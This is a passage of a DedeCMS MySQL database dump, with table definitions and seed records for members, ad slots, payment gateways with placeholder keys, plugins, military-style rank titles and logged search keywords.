  `indexname` varchar(30) NOT NULL,
  `indexurl` varchar(50) NOT NULL,
  PRIMARY KEY (`stowname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_stowtype
-- ----------------------------
INSERT INTO dede_member_stowtype VALUES ('sys', '系统收藏', 'archives_do.php');
INSERT INTO dede_member_stowtype VALUES ('book', '小说收藏', '/book/book.php?bid');

-- ----------------------------
-- Table structure for `dede_member_tj`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_tj`;
CREATE TABLE `dede_member_tj` (
  `mid` mediumint(8) NOT NULL AUTO_INCREMENT,
  `article` smallint(5) unsigned NOT NULL DEFAULT '0',
  `album` smallint(5) unsigned NOT NULL DEFAULT '0',
  `archives` smallint(5) unsigned NOT NULL DEFAULT '0',
  `homecount` int(10) unsigned NOT NULL DEFAULT '0',
  `pagecount` int(10) unsigned NOT NULL DEFAULT '0',
  `feedback` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `friend` smallint(5) unsigned NOT NULL DEFAULT '0',
  `stow` smallint(5) unsigned NOT NULL DEFAULT '0',
  `soft` int(10) NOT NULL DEFAULT '0',
  `info` int(10) NOT NULL DEFAULT '0',
  `shop` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_tj
-- ----------------------------
INSERT INTO dede_member_tj VALUES ('1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for `dede_member_type`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_type`;
CREATE TABLE `dede_member_type` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `rank` int(11) NOT NULL DEFAULT '0',
  `pname` varchar(50) NOT NULL DEFAULT '',
  `money` int(11) NOT NULL DEFAULT '0',
  `exptime` int(11) NOT NULL DEFAULT '30',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_type
-- ----------------------------
INSERT INTO dede_member_type VALUES ('1', '50', '中级会员半年', '100', '7');

-- ----------------------------
-- Table structure for `dede_member_vhistory`
-- ----------------------------
DROP TABLE IF EXISTS `dede_member_vhistory`;
CREATE TABLE `dede_member_vhistory` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `loginid` char(20) NOT NULL DEFAULT '',
  `vid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `vloginid` char(20) NOT NULL DEFAULT '',
  `count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `vip` char(15) NOT NULL DEFAULT '',
  `vtime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `vtime` (`vtime`) USING BTREE,
  KEY `mid` (`mid`,`vid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_member_vhistory
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_moneycard_record`
-- ----------------------------
DROP TABLE IF EXISTS `dede_moneycard_record`;
CREATE TABLE `dede_moneycard_record` (
  `aid` int(11) NOT NULL AUTO_INCREMENT,
  `ctid` int(11) NOT NULL DEFAULT '0',
  `cardid` varchar(50) NOT NULL DEFAULT '',
  `uid` int(11) NOT NULL DEFAULT '0',
  `isexp` smallint(6) NOT NULL DEFAULT '0',
  `mtime` int(11) NOT NULL DEFAULT '0',
  `utime` int(11) NOT NULL DEFAULT '0',
  `money` int(11) NOT NULL DEFAULT '0',
  `num` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `ctid` (`ctid`) USING BTREE,
  KEY `cardid` (`cardid`) USING BTREE,
  KEY `uid` (`uid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_moneycard_record
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_moneycard_type`
-- ----------------------------
DROP TABLE IF EXISTS `dede_moneycard_type`;
CREATE TABLE `dede_moneycard_type` (
  `tid` int(11) NOT NULL AUTO_INCREMENT,
  `num` int(11) NOT NULL DEFAULT '500',
  `money` int(11) NOT NULL DEFAULT '50',
  `pname` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_moneycard_type
-- ----------------------------
INSERT INTO dede_moneycard_type VALUES ('1', '100', '30', '100点卡');
INSERT INTO dede_moneycard_type VALUES ('2', '200', '55', '200点卡');
INSERT INTO dede_moneycard_type VALUES ('3', '300', '75', '300点卡');

-- ----------------------------
-- Table structure for `dede_mtypes`
-- ----------------------------
DROP TABLE IF EXISTS `dede_mtypes`;
CREATE TABLE `dede_mtypes` (
  `mtypeid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `mtypename` char(40) NOT NULL,
  `channelid` smallint(6) NOT NULL DEFAULT '1',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`mtypeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_mtypes
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_multiserv_config`
-- ----------------------------
DROP TABLE IF EXISTS `dede_multiserv_config`;
CREATE TABLE `dede_multiserv_config` (
  `remoteuploads` smallint(6) NOT NULL DEFAULT '0',
  `remoteupUrl` text NOT NULL,
  `rminfo` text,
  `servinfo` mediumtext,
  PRIMARY KEY (`remoteuploads`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_multiserv_config
-- ----------------------------
INSERT INTO dede_multiserv_config VALUES ('0', 'http://img.dedecms.com', '', '');

-- ----------------------------
-- Table structure for `dede_myad`
-- ----------------------------
DROP TABLE IF EXISTS `dede_myad`;
CREATE TABLE `dede_myad` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `clsid` smallint(5) NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `adname` varchar(60) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_myad
-- ----------------------------
INSERT INTO dede_myad VALUES ('1', '0', '0', 'indexTopBanner1', '首页顶部导航大图-500*60', '0', '1297933028', '1300525028', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=fronttopbanner&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('2', '0', '0', 'indexTopBanner2', '首页顶部导航小图-200*60', '0', '1297933605', '1300525605', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=fronttopbanner2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('3', '0', '0', 'innerTopBanner1', '(频道/列表)顶部导航大图-500*60', '0', '1297934052', '1300526052', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=innertopbanner1&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('4', '0', '0', 'innerTopBanner2', '(频道/列表)顶部导航小图-200*60', '0', '1297934104', '1300526104', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=innertopbanner2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('5', '0', '0', 'indexLeftBanner', '首页左侧大图广告-712*75', '0', '1297934791', '1300526791', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=indexleftbanner&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('6', '0', '0', 'indexRightLitpic1', '首页右侧小块图1-240*65', '0', '1297936106', '1300528106', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=indexrtlitpic1&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('7', '0', '0', 'indexRightLitpic2', '首页右侧小块图2-240*65', '0', '1297936768', '1300528768', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=indexrtlitpic2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('8', '0', '0', 'indexfooterAD', '首页底部图片广告-726*91', '0', '1297937814', '1300529814', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=indexfooterad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('9', '0', '0', 'innerfooterAD', '(频道/列表)底部图片广告-726*91', '0', '1297991183', '1300583183', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=innerfooterad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('10', '0', '0', 'innerfooterAD2', '内容底部图片广告-726*91', '0', '1297991709', '1300583709', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=innerfooterad2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('11', '0', '0', 'listRtPicAD', '(频道/列表)右侧图片广告-240*200', '0', '1297992254', '1300584254', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=listrtpicad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('12', '0', '0', 'contentRtPicAD', '内容右侧图片广告-240*200', '0', '1297995082', '1300587082', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=contentrtpicad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('13', '0', '0', 'listRtPicAD2', '(频道/列表)右侧图片广告2-240*200', '0', '1297996543', '1300588543', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=listrtpicad2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('14', '0', '0', 'contentRtPicAD2', '内容右侧图片广告2-240*200', '0', '1297997106', '1300589106', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=contentrtpicad2&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('15', '0', '0', 'contentMidPicAD', '内容页内容中广告-300*250', '0', '1297997971', '1300589971', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=contentmidpicad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('16', '0', '0', 'searchPicAD', '搜索页右侧广告-300*268', '0', '1297999720', '1300591720', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=searchpicad&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('17', '0', '0', 'indexRtpicAd3', '首页右侧图片广告-240*200', '0', '1298000077', '1300592077', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=indexrtpicad3&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('18', '0', '0', 'searchTopBanner', '搜索页面顶部banner广告-300*40', '0', '1298012954', '1300604954', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=searchtopbanner&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('19', '0', '0', 'contentTopBanner1', '内容顶部导航大图-500*60', '0', '1298017655', '1300609655', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=ctenttpbanner1&charset=gbk\"></script>', '');
INSERT INTO dede_myad VALUES ('20', '0', '0', 'contentTopBanner2', '内容顶部导航小图-200*60', '0', '1298017688', '1300609688', '<script type=\"text/javascript\" src=\"http://ad.dedecms.com/adsview/?action=single&key=ctenttpbanner2&charset=gbk\"></script>', '');

-- ----------------------------
-- Table structure for `dede_myadtype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_myadtype`;
CREATE TABLE `dede_myadtype` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typename` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_myadtype
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_mytag`
-- ----------------------------
DROP TABLE IF EXISTS `dede_mytag`;
CREATE TABLE `dede_mytag` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_mytag
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_payment`
-- ----------------------------
DROP TABLE IF EXISTS `dede_payment`;
CREATE TABLE `dede_payment` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `code` varchar(20) NOT NULL DEFAULT '',
  `name` varchar(120) NOT NULL DEFAULT '',
  `fee` varchar(10) NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `config` text NOT NULL,
  `enabled` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `cod` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `online` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `code` (`code`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_payment
-- ----------------------------
INSERT INTO dede_payment VALUES ('3', 'alipay', '支付宝', '2', '支付宝网站(www.alipay.com) 是国内先进的网上支付平台。<br/>DedeCMS联合支付宝推出支付宝接口。<br/><a href=\"https://www.alipay.com/himalayas/practicality_customer.htm?customer_external_id=C4335994340215837114&market_type=from_agent_contract&pro_codes=6ACD133C5F350958F7F62F29651356BB \" target=\"_blank\"><font color=\"red\">立即在线申请</font></a>', '1', 'a:4:{s:14:\"alipay_account\";a:4:{s:5:\"title\";s:14:\"支付宝用户账号\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:20:\"yuan12345xin@163.com\";}s:10:\"alipay_key\";a:4:{s:5:\"title\";s:14:\"交易安全校验码\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:6:\"dsfsdf\";}s:14:\"alipay_partner\";a:4:{s:5:\"title\";s:12:\"合作者身份ID\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:1:\"1\";}s:17:\"alipay_pay_method\";a:5:{s:5:\"title\";s:14:\"支付宝账号类型\";s:11:\"description\";s:52:\"请选择您最后一次跟支付宝签订的协议里面说明的接口类型\";s:4:\"type\";s:6:\"select\";s:5:\"iterm\";s:58:\"0:使用标准双接口,1:使用担保交易接口,2:使用即时到帐交易接口\";s:5:\"value\";s:1:\"1\";}}', '1', '0', '1');
INSERT INTO dede_payment VALUES ('2', 'bank', '银行汇款/转帐', '0', '银行名称	\n收款人信息：全称 ××× ；帐号或地址 ××× ；开户行 ×××。	\n注意事项：办理电汇时，请在电汇单“汇款用途”一栏处注明您的订单号。', '4', 'a:0:{}', '1', '1', '0');
INSERT INTO dede_payment VALUES ('1', 'cod', '货到付款', '0', '开通城市：×××	\n货到付款区域：×××', '3', 'a:0:{}', '1', '1', '0');
INSERT INTO dede_payment VALUES ('6', 'yeepay', 'YeePay易宝', '12', 'YeePay易宝（北京通融通信息技术有限公司）是专业从事多元化电子支付业务一站式服务的领跑者。在立足于网上支付的同时，YeePay易宝不断创新，将互联网、手机、固定电话整合在一个平台上，继短信支付、手机充值之后，首家推出了YeePay易宝电话支付业务，真正实现了离线支付，为更多传统行业搭建了电子支付的高速公路。YeePay易宝融合世界先进的电子支付文化，聚合众多金融、电信、IT、互联网等领域内的巨擘，旨在通过创新的支付机制，推动中国电子商务新进程。YeePay易宝致力于成为世界一流的电子支付应用和服务提供商，专注于金融增值服务和移动增值服务两大领域，创新并推广多元化、低成本的、安全有效的支付服务。<input type=\"button\" name=\"Submit\" value=\"立即注册\" onclick=\"window.open(\"https://www.yeepay.com/selfservice/requestRegister.action\")\" />', '2', 'a:2:{s:10:\"yp_account\";a:4:{s:5:\"title\";s:8:\"商户编号\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:2:\"aa\";}s:6:\"yp_key\";a:4:{s:5:\"title\";s:8:\"商户密钥\";s:11:\"description\";s:0:\"\";s:4:\"type\";s:4:\"text\";s:5:\"value\";s:3:\"dsa\";}}', '1', '0', '1');

-- ----------------------------
-- Table structure for `dede_plus`
-- ----------------------------
DROP TABLE IF EXISTS `dede_plus`;
CREATE TABLE `dede_plus` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `plusname` varchar(30) NOT NULL DEFAULT '',
  `menustring` varchar(200) NOT NULL DEFAULT '',
  `mainurl` varchar(50) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `filelist` text,
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_plus
-- ----------------------------
INSERT INTO dede_plus VALUES ('27', '友情链接模块', '<m:item name=\'友情链接\' link=\'friendlink_main.php\' rank=\'plus_友情链接\' target=\'main\' />', '', '织梦团队', '1', '');
INSERT INTO dede_plus VALUES ('24', '文件管理器', '<m:item name=\'文件管理器\' link=\'file_manage_main.php\' rank=\'plus_文件管理器\' target=\'main\' />', '', '织梦团队', '1', '');
INSERT INTO dede_plus VALUES ('23', '百度新闻', '<m:item name=\'百度新闻\' link=\'baidunews.php\' rank=\'plus_百度新闻\' target=\'main\' />', '', '织梦团队', '1', 'baidunews.php');
INSERT INTO dede_plus VALUES ('28', '投票模块', '<m:item name=\'投票模块\' link=\'vote_main.php\' rank=\'plus_投票模块\' target=\'main\' />', '', '织梦团队', '1', '');
INSERT INTO dede_plus VALUES ('25', '广告管理', '<m:item name=\'广告管理\' link=\'ad_main.php\' rank=\'plus_广告管理\' target=\'main\' />', '', '织梦官方', '1', '');
INSERT INTO dede_plus VALUES ('10', '挑错管理', '<m:item name=\'挑错管理\' link=\'erraddsave.php\' rank=\'plus_挑错管理\' target=\'main\' />', '', '织梦团队', '1', '<m:item name=\'挑错管理\' link=\'catalog_do.php?dopost=erraddsave.php\' rank=\'plus_挑错管理\' target=\'main\' />');

-- ----------------------------
-- Table structure for `dede_production`
-- ----------------------------
DROP TABLE IF EXISTS `dede_production`;
CREATE TABLE `dede_production` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `detail` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_production
-- ----------------------------
INSERT INTO dede_production VALUES ('65', '21', '', '', '222.211.124.86', '');
INSERT INTO dede_production VALUES ('66', '21', '', '', '222.211.124.86', '震');
INSERT INTO dede_production VALUES ('75', '21', '', '', '222.211.124.86', '');
INSERT INTO dede_production VALUES ('76', '21', '', '', '222.211.124.86', '');
INSERT INTO dede_production VALUES ('77', '21', '', '', '222.211.124.86', '');
INSERT INTO dede_production VALUES ('78', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('79', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('80', '21', '', '', '222.211.124.86', '');
INSERT INTO dede_production VALUES ('116', '21', '', '', '222.211.123.68', '');
INSERT INTO dede_production VALUES ('117', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('118', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('119', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('120', '21', '', '', '125.70.185.81', '');
INSERT INTO dede_production VALUES ('121', '21', '', '', '125.70.185.81', '');

-- ----------------------------
-- Table structure for `dede_purview`
-- ----------------------------
DROP TABLE IF EXISTS `dede_purview`;
CREATE TABLE `dede_purview` (
  `mid` mediumint(8) DEFAULT '0',
  `typeid` smallint(5) DEFAULT '0',
  `rank` smallint(6) DEFAULT NULL,
  `pkey` varchar(30) CHARACTER SET latin1 NOT NULL,
  `pvalue` text NOT NULL,
  KEY `pkey` (`pkey`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_purview
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_pwd_tmp`
-- ----------------------------
DROP TABLE IF EXISTS `dede_pwd_tmp`;
CREATE TABLE `dede_pwd_tmp` (
  `mid` mediumint(8) NOT NULL,
  `membername` char(16) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `mailtime` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_pwd_tmp
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_ratings`
-- ----------------------------
DROP TABLE IF EXISTS `dede_ratings`;
CREATE TABLE `dede_ratings` (
  `id` varchar(11) NOT NULL,
  `total_votes` int(11) NOT NULL DEFAULT '0',
  `total_value` int(11) NOT NULL DEFAULT '0',
  `used_ips` longtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_ratings
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_scores`
-- ----------------------------
DROP TABLE IF EXISTS `dede_scores`;
CREATE TABLE `dede_scores` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `titles` char(15) NOT NULL,
  `icon` smallint(6) unsigned DEFAULT '0',
  `integral` int(10) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `integral` (`integral`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_scores
-- ----------------------------
INSERT INTO dede_scores VALUES ('2', '列兵', '1', '0', '1');
INSERT INTO dede_scores VALUES ('3', '班长', '2', '1000', '1');
INSERT INTO dede_scores VALUES ('4', '少尉', '3', '2000', '1');
INSERT INTO dede_scores VALUES ('5', '中尉', '4', '3000', '1');
INSERT INTO dede_scores VALUES ('6', '上尉', '5', '4000', '1');
INSERT INTO dede_scores VALUES ('7', '少校', '6', '5000', '1');
INSERT INTO dede_scores VALUES ('8', '中校', '7', '6000', '1');
INSERT INTO dede_scores VALUES ('9', '上校', '8', '9000', '1');
INSERT INTO dede_scores VALUES ('10', '少将', '9', '14000', '1');
INSERT INTO dede_scores VALUES ('11', '中将', '10', '19000', '1');
INSERT INTO dede_scores VALUES ('12', '上将', '11', '24000', '1');
INSERT INTO dede_scores VALUES ('15', '大将', '12', '29000', '1');

-- ----------------------------
-- Table structure for `dede_search_cache`
-- ----------------------------
DROP TABLE IF EXISTS `dede_search_cache`;
CREATE TABLE `dede_search_cache` (
  `hash` char(32) NOT NULL,
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `rsnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `ids` mediumtext,
  PRIMARY KEY (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_search_cache
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_search_keywords`
-- ----------------------------
DROP TABLE IF EXISTS `dede_search_keywords`;
CREATE TABLE `dede_search_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(30) NOT NULL DEFAULT '',
  `spwords` char(50) NOT NULL DEFAULT '',
  `count` mediumint(8) unsigned NOT NULL DEFAULT '1',
  `result` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_search_keywords
-- ----------------------------
INSERT INTO dede_search_keywords VALUES ('1', '学校优势', '学校优势 优势 学校', '1', '0', '1430492339', '0', '0');
INSERT INTO dede_search_keywords VALUES ('2', '高层管理培训', '高层管理培训 管理培训 高层', '1', '0', '1430581228', '0', '0');
INSERT INTO dede_search_keywords VALUES ('3', '酷6网', '酷6网', '1', '0', '1430649975', '0', '0');
INSERT INTO dede_search_keywords VALUES ('4', '美甲培训', '美甲培训 培训 美甲', '1', '0', '1430655605', '0', '0');
INSERT INTO dede_search_keywords VALUES ('5', '化妆培训', '化妆培训 化妆 培训', '1', '0', '1430659537', '0', '0');
INSERT INTO dede_search_keywords VALUES ('6', '金典化妆学校', '金典化妆学校 化妆 学校 金典', '1', '0', '1430669277', '0', '0');
INSERT INTO dede_search_keywords VALUES ('7', '开学季', '开学季 开学', '1', '0', '1430670808', '0', '0');
INSERT INTO dede_search_keywords VALUES ('8', '雪佛兰乐风', '雪佛兰乐风 乐风 雪佛兰', '1', '0', '1430677449', '0', '0');
INSERT INTO dede_search_keywords VALUES ('9', '喷枪培训', '喷枪培训 喷枪 培训', '1', '0', '1430682704', '0', '0');
INSERT INTO dede_search_keywords VALUES ('10', '优酷网络', '优酷网络 优酷 网络', '1', '0', '1430691183', '0', '0');
INSERT INTO dede_search_keywords VALUES ('11', '我乐网', '我乐网 乐网', '1', '0', '1430696145', '0', '0');
INSERT INTO dede_search_keywords VALUES ('12', '企业培训师', '企业培训师 企业培训', '1', '0', '1430720743', '0', '0');
INSERT INTO dede_search_keywords VALUES ('13', '群丽化妆', '群丽化妆 化妆 群丽', '1', '0', '1430722707', '0', '0');
INSERT INTO dede_search_keywords VALUES ('14', '上海化妆培训', '上海化妆培训 上海 化妆 培训', '2', '0', '1430729406', '0', '0');
INSERT INTO dede_search_keywords VALUES ('15', '成都化妆培训', '成都化妆培训 化妆 培训 成都', '1', '0', '1430743678', '0', '0');
INSERT INTO dede_search_keywords VALUES ('16', '雪科鲁兹', '雪科鲁兹 雪科', '1', '0', '1430746238', '0', '0');
INSERT INTO dede_search_keywords VALUES ('17', 'as', 'as', '28', '0', '1432447358', '0', '0');
INSERT INTO dede_search_keywords VALUES ('18', 'xxx', 'xxx', '3', '0', '1431698253', '0', '0');
INSERT INTO dede_search_keywords VALUES ('19', '1111', '1111', '4', '0', '1431438011', '0', '0');
INSERT INTO dede_search_keywords VALUES ('20', 'c4rp3nt3r', 'c4rp3nt3r c4rp3nt3r', '1', '0', '1431543359', '0', '0');
INSERT INTO dede_search_keywords VALUES ('21', '111aaaaaaaaaaaaaaaa1', '111aaaaaaaaaaaaaaaa1 111aaaaaaaaaaaaaaaa1', '3', '0', '1432299273', '0', '0');
INSERT INTO dede_search_keywords VALUES ('22', '11', '11', '2', '0', '1432299269', '0', '0');
INSERT INTO dede_search_keywords VALUES ('23', '=){this.value=输入关键字;}', '=){this.value=输入关键字;} this.value 关键字 输入', '1', '0', '1432299272', '0', '0');

-- ----------------------------
-- Table structure for `dede_sgpage`
-- ----------------------------
DROP TABLE IF EXISTS `dede_sgpage`;
CREATE TABLE `dede_sgpage` (
  `aid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(60) NOT NULL DEFAULT '',
  `ismake` smallint(6) NOT NULL DEFAULT '1',
  `filename` varchar(60) NOT NULL DEFAULT '',
  `keywords` varchar(30) NOT NULL DEFAULT '',
  `template` varchar(30) NOT NULL DEFAULT '',
  `likeid` varchar(20) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `ismake` (`ismake`,`uptime`) USING BTREE,
  KEY `likeid` (`likeid`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_sgpage
-- ----------------------------

-- ----------------------------
-- Table structure for `dede_shops_delivery`
-- ----------------------------
DROP TABLE IF EXISTS `dede_shops_delivery`;
CREATE TABLE `dede_shops_delivery` (
  `pid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `dname` char(80) NOT NULL,
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `des` char(255) DEFAULT NULL,
  `orders` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`),
  KEY `orders` (`orders`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_shops_delivery
-- ----------------------------
